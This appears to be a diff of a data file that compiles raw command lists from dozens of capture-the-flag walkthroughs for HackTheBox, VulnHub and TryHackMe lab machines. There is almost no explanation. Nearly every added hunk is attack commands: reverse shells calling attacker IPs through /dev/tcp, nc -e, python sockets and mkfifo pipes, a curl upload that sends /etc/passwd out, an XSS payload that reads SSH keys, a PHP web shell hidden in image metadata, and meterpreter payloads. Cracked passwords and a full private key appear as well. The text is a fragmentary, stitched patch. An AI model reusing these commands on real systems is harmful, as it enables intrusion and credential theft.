+YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+atlanta1
+su paul
+atlanta1
+cd paul
+ls -la
+cat user.txt
+cd .ssh
+ls -la
+cat id_rsa
+cat id_rsa.pub
+nano key
+chmod 600 key
+ssh -i key nadav@10.129.109.173
+cd /tmp
+wget 10.10.14.38:8000/lenpeas.sh
+chmod 777 lenpeas.sh
+./lenpeas.sh
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/raj.txt true
+ls
+cat raj.txt
+nano rootkey
+chmod 600 rootkey
+ssh -i rootkey root@10.129.109.173
+cd /root
+cat root.txt
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/shell_rsa true
+ssh -i shell_rsa root@127.0.0.1
+ls
+root.txt
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/jewel-hackthebox-walkthrough/
+nmap -sC 10.129.104.163
+http://10.129.104.163:8000/gitweb/
+bill    bill@mail.htb $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+jennifer        jennifer@mail.htb $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
+john -w=/usr/share/wordlists/rockyou.txt bill
+python3 raj.py 10.129.104.163 10.10.14.48 1234
+nc -lvp 1234
+ls -la
+cat user.txt
+cat .google_authenticator
+2UQI3R52WFCLE6JTLDCSJYMJH4
+sudo -l
+python -c 'import pty;pty.spawn("bash")'
+sudo -l
+spongebob
+sudo -l
+spongebob
+104007
+sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+id
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/nest-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/sneakymailer-hackthebox-walkthrough/
+nmap -A 10.129.101.34
+smbclient -L 10.129.101.34
+smbclient \\\\10.129.101.34\\Data
+cd Shared\
+cd Templates\
+cd HR\
+get "Welcome Email.txt"
+cd Maintenance
+get "Maintenance Alerts.txt"
+cat 'Welcome Email.txt'
+Username: TempUser
+Password welcome2019
+smbclient \\\\10.129.101.34\\Data -U TempUser
+cd IT
+cd Configs
+cd "RU Scanner"
+get RU_config.xml
+cd Configs
+cd NotepadPlusPlus
+get config.xml
+C:\windows\System32\drivers\etc\hosts
+\\HTB-NEST\Secure$\IT\Carl\Temp.txt
+C:\Users\C.Smits\Desktop\todo.txt
+cat RU_config.xml
+Username: c.smith
+fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
+smbclient \\\\10.129.101.34\\Secure -U TempUser
+cd IT
+cd Carl
+cd "VB Projects"
+cd WIP
+cd RU
+cd RUScanner
+get Utils.vb
+get Module1.vb
+Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=
+xRxRxPANCAK3SxRxRx
+smbclient \\\\10.129.101.34\\users -U C.Smith
+cd C.Smith
+get user.txt
+exit
+cat user.txt
+smbclient \\\\10.129.101.34\\users -U C.Smith
+cd C.Smith
+cd "HQK Reporting"
+get HQK_Config_Backup.xml
+get "Debug Mode Password.txt"
+exit
+cat 'Debug Mode Password.txt'
+cat HQK_Config_Backup.xml
+allinfo "Debug Mode Password.txt"
+DEBUGM~1.TXT
+[:Passwword:$DATA]
+get DEBUGM~1.txt:password
+cat DEBUGM~1.txt: password
+WBQ201953D8w
+telnet 10.129.101.34 4386
+help
+DEBUG WBQ201953D8w
+setdir ..
+list
+LDAP
+setdir ldap
+list
+showquery 2
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+cd "AD Integration Module"
+get HqkLdap.exe
+(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z")
+(Decrypt, "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", 667912, "131Rf99", 3, "1L1SA61493DRV53Z", 256)
+XtH4nkS4Pl4y1nGX
+python3 psexec.py Administrator@10.129.101.34
+cd C:\Users\Administrator\Desktop\
+type root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/resolute-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/sniper-hackthebox-walkthrough/
+nmap -sC -sV 10.129.1.152
+enum4linux 10.129.1.152
+hydra -L user.txt -p Welcome123! 10.129.1.152 smb
+evil-winrm -i 10.129.1.152 -u melanie -p 'Welcome123!'
+cd C:\Users\melanie\Desktop
+type user.txt
+ls -force
+ryan Serv3r4Admin4cc123!
+evil-winrm -i 10.129.1.152 -u ryan -p 'Serv3r4Admin4cc123!'
+whoami /groups
+python3 smbserver.py -smb2support raj /root/
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.64\raj\raj.dll
+sc.exe stop dns
+sc.exe start dns
+nc -lvp 4444
+cd c:\\Users\Administrator\Desktop
+type root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/querier-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/chaos-hackthebox-walkthrough/
+nmap -sC -sV 10.129.1.147
+smbclient -L 10.129.1.147
+smbclient //10.129.1.147/Reports
+file 'Currency Volume Report.xlsm'
+unzip 'Currency Volume Report.xlsm'
+cd xl
+strings vbaProject.bin
+User:     reporting
+Password: PcwTWTHRwryjc$c6
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+python setup.py install
+python3 mssqlclient.py -windows-auth querier/reporting@10.129.1.147
+enable_xp_cmdshell
+responder -I tun0
+xp_dirtree "\\10.10.14.64\raj"
+john -w=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.129.1.147.txt
+corporate568
+python3 mssqlclient.py -windows-auth querier/mssql-svc@10.129.1.147
+RECONFIGURE
+xp_cmdshell "whoami"
+cd /usr/share/windows-binaries
+python -m SimpleHTTPServer
+xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.64:8000/nc.exe -OutFile C:\Users\mssql-svc\nc.exe "
+xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.64:8000/winPEAS.exe -OutFile C:\Users\mssql-svc\winPEAS.exe "
+xp_cmdshell "c:\users\mssql-svc\nc.exe -e cmd.exe 10.10.14.64 4444"
+cd c:\users\mssql-svc
+WinPEAS.exe
+Username: Administrator
+Password: MyUnclesAreMarioAndLuigi!!1!
+evil-winrm -i 10.129.1.147 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
 
 
 
 Challenge URL: https://www.hackingarticles.in/openkeys-hackthebox-walkthrough/
+nmap -sC -sV 10.129.39.140
+http://10.129.39.140
+gobuster dir -u http://10.129.39.140 -w /usr/share/wordlists/dirb/common.txt
+http://10.129.39.140/includes/
+strings auth.php.swp
+vim -r auth.php.swp
+http://10.129.39.140/auth_helpers
+file check_auth
+ssh -i key jennifer@10.129.39.140
+cat user.txt
+uname -a
+nano authroot.sh
+python -m SimpleHTTPServer
+curl -O http://10.10.14.64:8000/authroot.sh
+chmod 777 authroot.sh
+./authroot.sh
+EGG LARD GROW HOG DRAG LAIN
+id
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/cache-hackthebox-walkthrough/
+nmap -sC -sV 10.129.2.219
+cewl -w dict.txt http://10.129.2.219/author.html
+wfuzz -hh 8193 -H 'Host: FUZZ.htb' -u http://10.129.2.219/ --hc 400 -2 dict.txt
+cat /etc/hosts
+http://hms.htb
+cat req.txt
+sqlmap -r req.txt --dbs --batch
+sqlmap -r req.txt -D openemr --tables --batch
+sqlmap -r req.txt -D openemr -T users_secure --dump
+nano hash
+john --wordlists=/usr/share/wordlists/rockyou.txt hash
+searchsploit openemr 5.0.1
+searchsploit -m 45161
+python 45161 http://hms.htb -u openemr_admin -p xxxxxx -c '/bin/bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'
+nc -lvp 4444
+id
+cd /home
+python3 -c "import pty;pty.spawn('/bin/bash')"
+su ash
+id
+cat user.txt
+ss -tnl
+telnet localhost 11211
+get user
+get passwd
+su luffy
+id
+docker image ls
+cd /mnt
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/book-hackthebox-walkthrough/
+nmap -sV -sC 10.129.1.55
+http://10.129.1.55
+dirb http://10.129.1.55
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
+G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
+WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
+ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
+7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
+75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
+3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
+McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
+tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
+jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
+7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
+GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
+E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
+ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
+SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
+skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
+o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
+Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
+hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
+Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
+sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
+tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
+5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
+y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
+nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
+-----END RSA PRIVATE KEY-----
+ssh -i key reader@10.129.1.55
+cat user.txt
+wget 10.10.14.64:8000/pspy64
+chmod 777 pspy64
+./pspy64
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc -o logrotten logrotten.c
+python -m SimpleHTTPServer
+wget 10.10.14.64:8000/logrotten
+chmod 777 logrotten
+nano ignite
+cp /root/.ssh/id_rsa /tmp/key; chmod +r /tmp/key
+./logrotten -p ./ignite /home/reader/backups/access.log
+ls
+ssh -i key root@127.0.0.1
+cd root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/remote-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/traceback-hackthebox-walkthrough/
+nmap -A 10.129.77.180
+mkdir /tmp/raj
+showmount -e 10.129.77.180
+mount -t nfs 10.129.77.180:/site_backups /tmp/raj
+strings Umbraco.sdf | grep admin
+john –wordlist=/usr/share/wordlists/rockyou.txt hash
+git clone https://github.com/noraj/Umbraco-RCE
+cd Umbraco-RCE
+pip3 install -r requirements.txt
+python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.77.180' -c powershell.exe -a 'hostname; pwd; whoami'
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.52
+set srvhost 10.10.14.52
+exploit
+python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.77.180' -c powershell.exe -a '[Exploit Code]';
+sessions 1
+sysinfo
+pwd
+cd C:\Users\Public
+cat user.txt
+cd Program Files (x86)
+ls
+cd TeamViewer
+ls
+use post/windows/gather/credentials/teamviewer_passwords
+set session 1
+exploit
+gem install evil-winrm
+evil-winrm -u administrator -p !R3m0te! -i 10.129.77.180
 
 
 
 Challenge URL: https://www.hackingarticles.in/magic-hackthebox-walkthrough/
+nmap -sV 10.129.77.148
+http://10.129.77.148
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' 1.png
+mv 1.png shell.php.png
+http://10.129.77.148/images/uploads/shell.php.png?cmd=id
+http://10.129.77.148/images/uploads/shell.php.png?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+nc -lvp 1234
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /var/www/Magic/
+cat db.php5
+mysqldump Magic -u theseus -p
+iamkingtheseus
+su theseus
+Th3s3usW4sK1ng
+cd theseus
+cat user.txt
+find / -perm -u=s 2>/dev/null
+strings /bin/sysinfo
+cd /tmp
+echo "/bin/bash" > free
+chmod 777 free
+export PATH=/tmp:$PATH
+/bin/sysinfo
 
 
 
 Challenge URL: https://www.hackingarticles.in/lacasadepapel-hackthebox-walkthrough/
+nmap -sC -sV 10.129.79.144
+file_get_contents('/home/nairobi/ca.key')
+file_get_contents('/etc/passwd')
+openssl s_client -connect 10.129.79.144:443 2>/dev/null
+openssl pkcs12 -inkey ca.key -in certificate.pem -export -out cert.p12
+https://10.129.79.144/?path=../.ssh
+echo "../.ssh/id_rsa" | base64
+https://lacasadepel.htb/file/Li4vLnNzaC9pZF9yc2E=
+sudo /usr/bin/nc 10.10.14.85 4444 -e /bin/sh
+nc -lvp 4444
+id
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/fuse-hackthebox-walkthrough/
+nmap -sC -sV 10.129.2.5
+cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
+hydra -L users.txt -P pwd.txt 10.129.2.5 smb
+smbclient -L 10.129.2.5 -U tlavel
+smbpasswd -r 10.129.2.5 -U tlavel
+Fabricorp01
+Password@123987
+rpcclient -U tlavel 10.129.2.5
+$fab@s3Rv1ce$1
+enumprinters
+crackmapexec winrm 10.129.2.5 -u users.txt -p '$fab@s3Rv1ce$1'
+evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'
+Download Capcom.sys
+Download ExploitCapcom.exe
+whoami /priv
+upload /root/Downloads/Capcom.sys .
+upload /root/Downloads/ExploitCapcom.exe .
+.\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
+.\ExploitCapcom.exe EXPLOIT whoami
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f exe > shell.exe
+upload /root/Downloads/shell.exe .
+.\ExploitCapcom.exe EXPLOIT shell.exe
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.52
+exploit
+getsystem
+ls
+cd Administrator
+cd Desktop
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/doctor-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/swagshop-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/admirer-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/forest-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/traverxec-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/cascade-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/bastard-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/servmon-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/mango-hackthebox-walkthrough/
+nmap -A -p- 10.10.10.209
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "curl -F 'data=@/etc/passwd' http://10.10.XX.XX:6666
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "nc.traditional -e /bin/sh 10.10.XX.XX 6666"
 
 
 
@@ -373,22 +2102,6 @@ sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
 
 
 
-Challenge URL: https://www.hackingarticles.in/omni-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/tabby-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/ctf-collection-vol-1-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/conceal-hackthebox-walkthrough/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/
 nmap -sC -sV -p- 192.168.1.31
 http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd
@@ -404,38 +2117,6 @@ cat flag.txt
 Challenge URL: https://www.hackingarticles.in/cybox-1-vulnhub-walkthrough/
 nmap -p- -A cybox.thm
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-
-
-
-Challenge URL: https://www.hackingarticles.in/iron-corp-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/ghizer-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/0day-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/the-server-from-hell-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/revenge-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/internal-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/startup-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/relevant-tryhackme-walkthrough/
 
 
 
@@ -1044,10 +2725,6 @@ bash
 
 
 
-Challenge URL: https://www.hackingarticles.in/broken-2020-1-vulnhub-walkthrough/
-
-
-
 Challenge URL: https://www.hackingarticles.in/sunset-midnight-vulnhub-walkthrough/
 netdiscover -i ethX
 nmap -A –p- 192.168.10.178
@@ -1070,10 +2747,6 @@ nmap -A -p- 192.168.10.172
 Challenge URL: https://www.hackingarticles.in/greenoptic-1-vulnhub-walkthrough/
 netdiscover
 nmap -A -p- 192.168.10.160
-
-
-
-Challenge URL: https://www.hackingarticles.in/hackthebox-sauna-walkthrough/
 
 
 
@@ -5152,10 +6825,6 @@ docker run -v /:/root -i -t olympia /bin/bash
 
 
 
-Challenge URL: https://www.hackingarticles.in/blunder-hackthebox-walkthrough/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hack-the-box-sunday-walkthrough/
 nmap -p- -A 10.10.10.76 --open
 use auxiliary/scanner/finger/finger_users
@@ -5513,10 +7182,6 @@ cd /root
 ls
 cat flag.txt
 cat note.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-the-box-silo-walkthrough/
 
 
 
@@ -6543,10 +8208,6 @@ ls
 
 
 
-Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-optimum-walkthrough/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-brainfuck-walkthrough/
 nmap -A 10.10.10.17
 wpscan -u https://brainfuck.htb/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
@@ -6768,10 +8429,6 @@ unmask 000
 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
 cd root
 cat root.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-arctic-walkthrough/
 
 
 
@@ -7024,10 +8681,6 @@ cat flag.txt
 
 
 
-Challenge URL: https://www.hackingarticles.in/hack-the-vulnupload-vm-ctf-challenge/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hack-the-derpnstink-vm-ctf-challenge/
 netdiscover
 nmap -p- -A 192.168.1.102 --open
@@ -7085,14 +8738,6 @@ wget  -r –no-check-certificate http://192.168.0.18:15020/vault
 find ./ -type f | grep -v .html
 hashcat -m 2500 -a 0 ctf.hccapx 192.168.0.18:15020/rockyou.txt
 https://192.168.0.18:15020/blog/admin/edit.php?id=7 /*union*/union/*all*/all/*select*/select%20,1,login,password,4%20from%20users%20order%20by%201%20limit%201,1
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-ether-evilscience-vm-ctf-challenge/
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-g0rmint-vm-ctf-challenge/
 
 
 
@@ -7162,10 +8807,6 @@ whoami
 cd /root
 ls
 cat flag.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-h-s-t-e-vm-ctf-challenge/
 
 
 
@@ -7271,26 +8912,6 @@ sudo zip /tmp/nisha.zip /home/zico/raj -T --unzip-command="sh -c /bin/bash"
 cd /root
 ls
 cat flag.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-thewall-vm-ctf-challenge/
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-imf-vm-ctf-challenge/
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-6days-vm-ctf-challenge/
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-64base-vm-ctf-challenge/
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-ew-skuzzy-vm-ctf-challenge/
 
 
 
@@ -7746,10 +9367,6 @@ cat flag.txt
 
 
 
-Challenge URL: https://www.hackingarticles.in/hack-necromancer-vm-ctf-challenge/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hack-billy-madison-vm-ctf-challenge/
 netdiscover
 nmap -p- -A 192.168.1.103
@@ -7792,10 +9409,6 @@ cat Billy_Madison12th_Grade_Fimal_Project.doc
 
 
 
-Challenge URL: https://www.hackingarticles.in/hack-seattle-vm-ctf-challenge/
-
-
-
 Challenge URL: https://www.hackingarticles.in/hack-acid-reloaded-vm-ctf-challenge/
 netdiscover
 nmap -A 192.168.1.106
@@ -7827,10 +9440,6 @@ ls
 id
 ls –la
 cat flag.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-breach-2-1-vm-ctf-challenge/
 
 
 
@@ -8056,10 +9665,6 @@ cat .5.txt
 String : B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
 unzip LOOT.zip
 cat THE-END.txt
-
-
-
-Challenge URL: https://www.hackingarticles.in/hack-breach-1-0-vm-ctf-challenges/
 
 
 
